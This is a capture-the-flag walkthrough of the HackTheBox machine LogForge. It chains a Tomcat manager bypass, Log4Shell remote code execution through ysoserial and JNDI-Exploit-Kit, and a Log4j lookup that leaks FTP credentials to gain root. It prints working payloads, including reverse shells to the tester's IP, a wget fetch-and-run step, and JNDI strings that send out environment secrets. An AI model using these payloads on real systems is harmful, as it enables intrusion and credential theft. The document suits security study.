---
title: HTB: LogForge
url: https://0xdf.gitlab.io/2021/12/29/htb-logforge.html
date: 2021-12-29T10:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-logforge, nmap, uhc, jsp, jsessionid, tomcat, feroxbuster, apache-tomcat-parse, burp, burp-repeater, msfvenom, war, log4shell, log4j, jndi, ysoserial, jndi-exploit-kit, ysoserial-modified, jd-gui, reverse-engineering, jar, wireshark, ldap, uri-parsing, htb-seal, htb-pikaboo, breaking-parser-logic, cpts-like
---

![LogForge](https://0xdfimages.gitlab.io/img/logforge-cover.png)

LogForge was a UHC box that HTB created entirely focused on Log4j / Log4Shell. To start, there’s an Orange Tsai attack against how Apache is hosting Tomcat, allowing the bypass of restrictions to get access to the manager page. From there, I’ll exploit Log4j to get a shell as the tomcat user. With a foothold on the machine, there’s an FTP server running as root listening only on localhost. This FTP server is Java based, and reversing it shows it’s using Log4j to log usernames. I’ll exploit this to leak the environment variables used to store the username and password needed to access the FTP server, and use that to get access to the root flag. The password also works to get a root shell. In Beyond Root I’ll look at using netcat to read the LDAP requests and do some binary RE of LDAP on the wire.

## Box Info

| Name | [LogForge](https://hackthebox.com/machines/logforge)  [LogForge](https://hackthebox.com/machines/logforge) [Play on HackTheBox](https://hackthebox.com/machines/logforge) |
| --- | --- |
| Release Date | [23 Dec 2021](https://twitter.com/hackthebox_eu/status/1474036088926838791) |
| Retire Date | 23 Dec 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creators | [ippsec ippsec](https://app.hackthebox.com/users/3769)  [Rayhan0x01 Rayhan0x01](https://app.hackthebox.com/users/60115) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.138
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-21 07:59 EST
Nmap scan report for 10.10.11.138
Host is up (0.097s latency).
Not shown: 65531 closed ports
PORT     STATE    SERVICE
21/tcp   filtered ftp
22/tcp   open     ssh
80/tcp   open     http
8080/tcp filtered http-proxy

Nmap done: 1 IP address (1 host up) scanned in 8.24 seconds
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.138
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-21 08:00 EST
Nmap scan report for 10.10.11.138
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ultimate Hacking Championship
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.04 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04.

There’s two filtered ports, 21 and 8080. I’ll want to check those out when I get access to the localhost somehow.

### Website - TCP 80

#### Site

The site just has a UHC logo:

![image-20211221081131322](https://0xdfimages.gitlab.io/img/image-20211221081131322.png)

The source for the page shows it is just as simple as it looks:

```

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Ultimate Hacking Championship</title>
<style>
body {
	background-image: url("images/logo.png");
	background-size: contain;
    background-repeat: no-repeat;
	background-color: #0c1f3b;
}
.main {
	display: flex;
	flex-direction: column;
	justify-content: center;
	text-align: center;
	line-height: 200px;
	color: #ffffff;
	font-size: 80px;
}
</style>
</head>
<body>

<div class="main">
<h1></h1>
<h2></h2>
</div>
</body>
</html>

```

#### Tech Stack

Just guessing at extensions for `index` didn’t find much. `/index.html`, `/index`, and `index.php` all returned 404.

The server headers give a few bits of information:

```

HTTP/1.1 200 
Date: Tue, 21 Dec 2021 13:11:05 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html;charset=UTF-8
Set-Cookie: JSESSIONID=6DA833F1BFA228D381D830DE7B28DA1C; Path=/; HttpOnly
Vary: Accept-Encoding
Content-Length: 489
Connection: close

```

First, the server is running Apache (as noted by `nmap`). But there’s also a `JSESSIONID` cookie. Googling that will show this is a J2EE (Java) thing:

![image-20211221082148431](https://0xdfimages.gitlab.io/img/image-20211221082148431.png)

With that in mind, checking `/index.jsp` returns the same page.

The 404 page does confirm it’s Java, showing Apache Tomcat with a version 9.0.31:

![image-20211221083004646](https://0xdfimages.gitlab.io/img/image-20211221083004646.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x jsp` since that’s clearly in use, and I’ll include `.java` and `.class` to see if anything that shouldn’t be present on the webserver happens to leak:

```

oxdf@parrot$ feroxbuster -u http://10.10.11.138 -x jsp,java,class

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.138
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [jsp, java, class]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403        9l       28w      277c http://10.10.11.138/admin
302        0l        0w        0c http://10.10.11.138/images
403        9l       28w      277c http://10.10.11.138/manager
403        9l       28w      277c http://10.10.11.138/server-status
[####################] - 3m    239992/239992  0s      found:4       errors:6166   
[####################] - 3m    119996/119996  533/s   http://10.10.11.138
[####################] - 3m    119996/119996  533/s   http://10.10.11.138/images

```

`/admin` could be interesting, but returns 403 Forbidden. `/server-status` is the Apache status page which typically has to be accessed from localhost. `/manager` is how Tomcat manages Java webservers. That’s interesting as well, but again, a 403 Forbidden. `/images` redirects to `/images/`, which returns 404, but I know from the HTML above that the UHC image is at `/images/logo.png`.

## Shell as tomcat

### Access /manager

I’ve referred to Orange Tsai’s 2018 Blackhat presentation on [Breaking Parser Logic](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) several times before (like in [Seal](/2021/11/13/htb-seal.html#shell-as-tomcat) and [Pikaboo](/2021/12/04/htb-pikaboo.html#shell-as-www-data)). This time it’s Tomcat hosted by Apache, which leads to this slide:

![image-20211221084728002](https://0xdfimages.gitlab.io/img/image-20211221084728002.png)

I suspect I’m getting a 403 from a rule in Apache that looks something like:

```

        <location /manager>
                order deny,allow
                allow from 127.0.0.1
                deny from all
        </location>

```

This rule would block access to the Tomcat manager page for any IP except for localhost. To get around this, I’ll visit `http://10.10.11.138/0xdf/..;/manager/` in Burp Repeater. Apache sees that as three directories deep, and it won’t match on the rule above . But Tomcat will process that as `/manager/`, and return that. It works:

[![image-20211221085244055](https://0xdfimages.gitlab.io/img/image-20211221085244055.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211221085244055.png)

Success is actually a 302 to `/manager/html`, but that’s where the admin panel is.

### WAR Fail

#### Tomcat Manager Panel

Visiting `http://10.10.11.138/0xdf/..;/manager/html` in Firefox returns a prompt for HTTP basic auth:

![image-20211221085505892](https://0xdfimages.gitlab.io/img/image-20211221085505892.png)

Guessing tomcat / tomcat provides access, and returns a standard Tomcat manager panel, including the first UHC flag in the Application paths.

[![image-20211221085538537](https://0xdfimages.gitlab.io/img/image-20211221085538537.png)](https://0xdfimages.gitlab.io/img/image-20211221085538537.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20211221085538537.png)

#### War Payload - Fail

Typically with access to this panel, I can upload a malicious WAR file and get execution. I’ll create a payload with `msfvenom`:

```

oxdf@parrot$ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.6 lport=443 -f war -o rev.war
Payload size: 13317 bytes
Final size of war file: 13317 bytes
Saved as: rev.war

```

When I try to upload it in the Tomcat manager, there’s an error:

![image-20211221090824671](https://0xdfimages.gitlab.io/img/image-20211221090824671.png)

The message is:

> ```

> FAIL - Deploy Upload Failed, Exception: [org.apache.tomcat.util.http.fileupload.impl.FileSizeLimitExceededException: The field deployWar exceeds its maximum permitted size of 1 bytes.]
>
> ```

If the maximum allowed upload is 1 byte, that effectively disables WAR uploads.

### Log4Shell

#### Background

Given the name of the box and the hype around the Log4j vulnerability, it makes sense to look at the Log4shell exploit here. The bug is in the Java logging library, Log4j, which is very common in Java frameworks. The issue comes with how [JNDI strings](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html) are handled.

> The Java Naming and Directory InterfaceTM (JNDI) is an application programming interface (API) that provides [naming](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html) and [directory](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html) functionality to applications written using the JavaTM programming language. It is defined to be independent of any specific directory service implementation.

The idea is that I could have the logging server provide more robust details with some lookups based on what’s in the logs. The vulnerability is that this can be abused to get Java to do some very dangerous things, all the way to code execution.

#### POC

To see if this might work, I’ll put a test string into different fields that might get logged by Tomcat. At first I tried things like the user agent and url, but those didn’t work. I suspect Apache is likely logging those, but Apache isn’t Java-based.

The common test string is something like:

```

${jndi:ldap://10.10.14.6/file}

```

If the server is vulnerable, it will connect back to me on TCP port 389 (LDAP) to request that file (I’ll use a LDAP server that doesn’t care about what comes after `/`, so `file` will work, but so would anything else.) I’ll start `tcpdump` and submit that to some fields in the manager page. For example, the “Expire sessions with idle >” field generates this POST, with the JNDI string in the POST body (url encoded):

```

POST /0xdf/..;/manager/html/expire?path=/ HTTP/1.1
Host: 10.10.11.138
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: http://10.10.11.138
Authorization: Basic dG9tY2F0OnRvbWNhdA==
Connection: close
Referer: http://10.10.11.138/0xdf/..;/manager/html/expire?path=/
Cookie: JSESSIONID=E5AB7A4A405F35DC095505B49732EB4C
Upgrade-Insecure-Requests: 1

idle=%24%7Bjndi%3Aldap%3A%2F%2F10.10.14.6%2Ffile%7D

```

On sending, there’s a connection attempt from LogForge back to me on TCP 389 (LDAP):

```

oxdf@parrot$ sudo tcpdump -ni tun0 not port 80
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
09:15:50.934130 IP 10.10.11.138.55810 > 10.10.14.6.389: Flags [S], seq 1234181031, win 64240, options [mss 1357,sackOK,TS val 995632006 ecr 0,nop,wscale 7], length 0
09:15:50.934150 IP 10.10.14.6.389 > 10.10.11.138.55810: Flags [R.], seq 0, ack 1234181032, win 0, length 0

```

My host responded with a reset, because I’m not listening on LDAP. But still, that’s a successful exploit.

#### Execution

The next step is to get execution. I’ll need a bit more tooling. I’ll need an LDAP server that can respond as JNDI is expecting, and then I can send back a Java payload and have it execute.

The JNDI-Exploit-Kit is a neat way to do that. [This tweet](https://twitter.com/marcioalm/status/1470361495405875200) shows that it was updated to allow for a serialized Java payload as well, so I’ll use [that fork](https://github.com/pimps/JNDI-Exploit-Kit) of the project:

> Just added support to LDAP Serialized Payloads in the JNDI-Exploit-Kit. This attack path works in \*ANY\* java version as long the classes used in the Serialized payload are in the application classpath. Do not rely on your java version being up-to-date and update your log4j ASAP! [pic.twitter.com/z3B2UolisR](https://t.co/z3B2UolisR)
>
> — Márcio Almeida (@marcioalm) [December 13, 2021](https://twitter.com/marcioalm/status/1470361495405875200?ref_src=twsrc%5Etfw)

After downloading the release from the link in the readme, and grabbing [ysoserial](https://github.com/frohoff/ysoserial), I’ll create a payload:

```

oxdf@parrot$ ysoserial CommonsCollections5 'ping -c 1 10.10.14.6' > ping.ser

```

With `ysoserial`, it is building a serialized payload that will execute based on gadgets from common frameworks/libraries that might be in use on the target system. In this case, `CommonsCollections5` is uses a set of gadgets found in the version 3.1 of commons collections library in Java. The `CommonsCollections` series is a good place to start with `ysoserial`, but you may have to try all of them to find one that works.

Next, I’ll start the server. By default it listens on 1389 for LDAP, so it doesn’t have to run as root to get a low port. I want 389, so I’ll give it that, as well as my payload:

```

oxdf@parrot$ sudo java -jar /opt/JNDI-Exploit-Kit/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -P ping.ser -L 10.10.14.6:389
       _ _   _ _____ _____      ______            _       _ _          _  ___ _   
      | | \ | |  __ \_   _|    |  ____|          | |     (_) |        | |/ (_) |  
      | |  \| | |  | || |______| |__  __  ___ __ | | ___  _| |_ ______| ' / _| |_ 
  _   | | . ` | |  | || |______|  __| \ \/ / '_ \| |/ _ \| | __|______|  < | | __|
 | |__| | |\  | |__| || |_     | |____ >  <| |_) | | (_) | | |_       | . \| | |_ 
  \____/|_| \_|_____/_____|    |______/_/\_\ .__/|_|\___/|_|\__|      |_|\_\_|\__|
                                           | |                                    
                                           |_|               created by @welk1n 
                                                             modified by @pimps

[HTTP_ADDR] >> 10.10.14.6
[RMI_ADDR] >> 10.10.14.6
[LDAP_ADDR] >> 10.10.14.6
[COMMAND] >> open /System/Applications/Calculator.app
----------------------------JNDI Links----------------------------
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://10.10.14.6:1099/3mulkg
ldap://10.10.14.6:389/3mulkg
Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://10.10.14.6:1099/vwqmar
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://10.10.14.6:1099/bfzw4h
ldap://10.10.14.6:389/bfzw4h
Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
rmi://10.10.14.6:1099/uijckd
ldap://10.10.14.6:389/uijckd
Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):
rmi://10.10.14.6:1099/krt92z
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://10.10.14.6:1099/ajptf5
ldap://10.10.14.6:389/ajptf5
----------------------------Server Log----------------------------
2021-12-21 09:29:47 [JETTYSERVER]>> Listening on 10.10.14.6:8180
2021-12-21 09:29:47 [RMISERVER]  >> Listening on 10.10.14.6:1099
2021-12-21 09:29:47 [LDAPSERVER] >> Listening on 0.0.0.0:389

```

Next, with `tcpdump` listening, I’ll give the exploit string back into Tomcat, and there’s a connection:

```

2021-12-21 09:30:14 [LDAPSERVER] >> Send LDAP object with serialized payload: ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000037372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD85020008420006666F726D617449000A6C696E654E756D6265724C000F636C6173734C6F616465724E616D6571007E00054C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E00054C000A6D6F64756C654E616D6571007E00054C000D6D6F64756C6556657273696F6E71007E00057870010000005174000361707074002679736F73657269616C2E7061796C6F6164732E436F6D6D6F6E73436F6C6C656374696F6E7335740018436F6D6D6F6E73436F6C6C656374696F6E73352E6A6176617400096765744F626A65637470707371007E000B010000003371007E000D71007E000E71007E000F71007E001070707371007E000B010000002271007E000D74001979736F73657269616C2E47656E65726174655061796C6F616474001447656E65726174655061796C6F61642E6A6176617400046D61696E70707372001F6A6176612E7574696C2E436F6C6C656374696F6E7324456D7074794C6973747AB817B43CA79EDE020000787078737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B657971007E00014C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00017870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D6571007E00055B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E002F00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E002F7371007E00287571007E002C00000002707571007E002C00000000740006696E766F6B657571007E002F00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E002C7371007E0028757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000000174001470696E67202D6320312031302E31302E31342E36740004657865637571007E002F0000000171007E00347371007E0024737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000000770800000010000000007878

```

At `tcpdump`, there are ICMP packets:

```

oxdf@parrot$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
09:30:14.306963 IP 10.10.11.138 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
09:30:14.307005 IP 10.10.14.6 > 10.10.11.138: ICMP echo reply, id 2, seq 1, length 64

```

That’s proof of RCE.

#### Shell

`ysoserial` payloads like this don’t typically like payloads that include multiple commands with `;` or `|` or `&`. So I’ll get a shell in two steps (more in the next section). One payload will upload the reverse shell to `/dev/shm`, and another to execute it:

```

oxdf@parrot$ ysoserial CommonsCollections5 'wget 10.10.14.6/rev.sh -O /dev/shm/rev.sh' > getrev.ser
oxdf@parrot$ ysoserial CommonsCollections5 'bash /dev/shm/rev.sh' > runrev.ser

```

I’ll also create a simple `rev.sh`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

I’ll start JNDI-Exploit-Kit with `-P getrev.ser`, and trigger it again, and there’s a hit at my Python webserver:

```
10.10.11.138 - - [21/Dec/2021 09:48:36] "GET /rev.sh HTTP/1.1" 200 -

```

Now I’ll restart JNDI-Exploit-Kit with `-P runrev.ser` and trigger it, and I get a shell:

```

oxdf@parrot$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.138 47330
bash: cannot set terminal process group (773): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@LogForge:/var/lib/tomcat9$

```

I’ll do a shell upgrade:

```

tomcat@LogForge:/var/lib/tomcat9$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tomcat@LogForge:/var/lib/tomcat9$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
tomcat@LogForge:/var/lib/tomcat9$

```

I can also grab `user.txt` from `/home/htb`:

```

tomcat@LogForge:/home/htb$ cat user.txt
ac9dbe1d************************

```

#### Modified yso!

IppSec mentioned to me that there’s an updated [fork of ysoserial](https://github.com/pimps/ysoserial-modified) that includes:

> A good solution to fix that problem is pass the arguments to the method `Runtime.getRuntime().exec(String[].class)` that expects an array of Strings. The best option is execute the following: `Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", "command"})`. Passing the arguments that way, java will understand that you’re executing the /bin/bash passing the arguments -c and ‘command’ on the correct way and will execute your command inside of an terminal environment, what will allow you use nested or complex commands (with | or ;) and also control inputs and outputs (with < and >).

If I use the modified Jar, I can do a one-liner reverse shell:

```

oxdf@parrot$ java -jar /opt/ysoserial/ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' > rev.ser                                       WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/opt/ysoserial/ysoserial-modified.jar) to field javax.management.BadAttributeValueExpException.val
WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release   

```

In this version, I have to specify the shell I want to run with (in this case `bash`), as well as the payload. There’s a bunch of warnings, but it’s fine.

I’ll host this payload with JNDI-Exploit-Kit, and trigger, and get a shell:

```

oxdf@parrot$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.138 50870
bash: cannot set terminal process group (771): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@LogForge:/var/lib/tomcat9$ 

```

## Shell as root

### Enumeration

During the `nmap` scan, I noted the two filtered ports. 8080 is just Tomcat:

```

tomcat@LogForge:/home/htb$ curl localhost:8080

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Ultimate Hacking Championship</title>
<style>
body {
        background-image: url("images/logo.png");
        background-size: contain;
...[snip]...

```

But there is something listening on TCP 21:

```

tomcat@LogForge:/home/htb$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      771/java            
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -

```

In the filesystem root, there’s also an FTP JAR, `ftpServer-1.0-SNAPSHOT-all.jar`. That file is being run by root:

```

tomcat@LogForge:/$ ps auxww | grep ftp
root         941  0.1  2.0 3578000 81068 ?       Sl   15:15   0:02 java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar

```

### Reverse JAR

I’ll send the JAR back to my VM using `nc` (making sure to compare hashes to ensure it transferred correctly), and open it in [jd-gui](https://github.com/java-decompiler/jd-gui/releases). Immediately on opening the Log4j references jump out:

![image-20211221130157155](https://0xdfimages.gitlab.io/img/image-20211221130157155.png)

The `main` part (where the custom code is) has two classes:

![image-20211221134213631](https://0xdfimages.gitlab.io/img/image-20211221134213631.png)

The `main` function is in `Server`, where is uses Log4j, but not to log anything user controlled:

```

package main.java.com.ippsec.ftpServer;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Server {
  private int controlPort = 21;
  
  private ServerSocket welcomeSocket;
  
  boolean serverRunning = true;
  
  private static final Logger LOGGER = LogManager.getLogger(Server.class);
  
  public static void main(String[] args) {
    new Server();
  }
  
  public Server() {
    try {
      this.welcomeSocket = new ServerSocket(this.controlPort);
    } catch (IOException e) {
      LOGGER.error("Could not create server socket");
      System.exit(-1);
    } 
    LOGGER.info("FTP Server started listening on port " + this.controlPort);
    int noOfThreads = 0;
    while (this.serverRunning) {
      try {
        Socket client = this.welcomeSocket.accept();
        int dataPort = this.controlPort + noOfThreads + 1;
        Worker w = new Worker(client, dataPort);
        LOGGER.info("New connection received. Worker was created.");
        noOfThreads++;
        w.start();
      } catch (IOException e) {
        LOGGER.error("Exception encountered on accept");
        e.printStackTrace();
      } 
    } 
    try {
      this.welcomeSocket.close();
      System.out.println("Server was stopped");
    } catch (IOException e) {
      System.out.println("Problem stopping server");
      System.exit(-1);
    } 
  }
}

```

This class just starts the server, and then waits for a connection. When there’s a connection, it creates a `Worker` and hands it off to go back to listening.

In `Worker`, it is set up to handle all the various commands in the FTP protocol. It’s also using Log4j. The `handleUser` function jumps out as interesting:

```

  private void handleUser(String username) {
    LOGGER.warn("Login with invalid user: " + username);
    if (username.toLowerCase().equals(this.validUser)) {
      sendMsgToClient("331 User name okay, need password");
      this.currentUserStatus = userStatus.ENTEREDUSERNAME;
    } else if (this.currentUserStatus == userStatus.LOGGEDIN) {
      sendMsgToClient("530 User already logged in");
    } else {
      sendMsgToClient("530 Not logged in");
    } 
  }

```

It is passing the username to Log4j.

The other bit of interest is at the top of the class:

```

  private String validUser = System.getenv("ftp_user");
  
  private String validPassword = System.getenv("ftp_password");

```

The valid username and password are stored in environment variables.

### Leak Env Variables

#### Strategy

I could try using `ysoserial` again, but this application (which I can reverse and see without having to try) isn’t using any of the libraries associated with any of the gadgets, so it can’t succeed. There may be a way to generate a full Java class file to send back, but that is [disabled in recent version of Java](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/) (see appendix B). The source review gave a simpler path forward. I want to get access to the environment variables that hold the FTP username and password, which will at least get access to the FTP server running as root.

#### Get Path

I noted during the Tomcat exploitation of Log4Shell that I didn’t need to know what the file path was in the url in the JNDI string. But if I trigger it again with Wireshark running, I can see it:

![image-20211221135422472](https://0xdfimages.gitlab.io/img/image-20211221135422472.png)

To prove that further, I’ll change it in the string submitted into Tomcat and look for the update:

![image-20211221135529185](https://0xdfimages.gitlab.io/img/image-20211221135529185.png)

#### Put Env in Path

I’ll build a JNDI string that exfils the `ftp_user` environment variable:

```

${jndi:ldap://10.10.14.6/ftp_user:${env:ftp_user}}

```

When I use that to log into FTP, it hangs for a second, and then reports failure:

```

tomcat@LogForge:/var/lib/tomcat9$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ${jndi:ldap://10.10.14.6/ftp_user:${env:ftp_user}}
530 Not logged in
Login failed.
Remote system type is FTP.
ftp>

```

In WireShark:

![image-20211221140532637](https://0xdfimages.gitlab.io/img/image-20211221140532637.png)

I can do the same with `ftp_password`:

```

${jndi:ldap://10.10.14.6/ftp_password:${env:ftp_password}}

```

And WireShark shows it as well:

![image-20211221140626419](https://0xdfimages.gitlab.io/img/image-20211221140626419.png)

I could also just make one payload that shows both:

```

${jndi:ldap://10.10.14.6/user:${env:ftp_user}:password:${env:ftp_password}}

```

Returns:

![image-20211221140823659](https://0xdfimages.gitlab.io/img/image-20211221140823659.png)

### FTP Access

With that username and password, I’m able to log into FTP:

```

tomcat@LogForge:/var/lib/tomcat9$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ippsec
331 User name okay, need password
Password:
230-Welcome to HKUST
230 User logged in successfully
Remote system type is FTP.
ftp> ls
200 Command OK
125 Opening ASCII mode data connection for file list.
.profile
.ssh
snap
ftpServer-1.0-SNAPSHOT-all.jar
.bashrc
.selected_editor
run.sh
.lesshst
.bash_history
root.txt
.viminfo
.cache
226 Transfer complete.

```

It looks like it’s running in `/root`. I’ll grab `root.txt`. If I’m running in a dir I can’t write in, it will fail:

```

ftp> get root.txt
local: root.txt remote: root.txt
local: root.txt: Permission denied

```

`lcd` will change to another dir, and then it works:

```

ftp> lcd /tmp
Local directory now /tmp
ftp> get root.txt
local: root.txt remote: root.txt
200 Command OK
150 Opening ASCII mode data connection for requested file root.txt
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 File transfer successful. Closing data connection.
33 bytes received in 0.00 secs (716.1458 kB/s)

```

And I can read the flag:

```

tomcat@LogForge:/var/lib/tomcat9$ cat /tmp/root.txt
031e42f6************************

```

### Shell

It turns out that password also works for `su` to root:

```

htb@LogForge:~$ su -
Password: 
root@LogForge:~#

```

## Beyond Root

### Getting the LDAP Path with nc

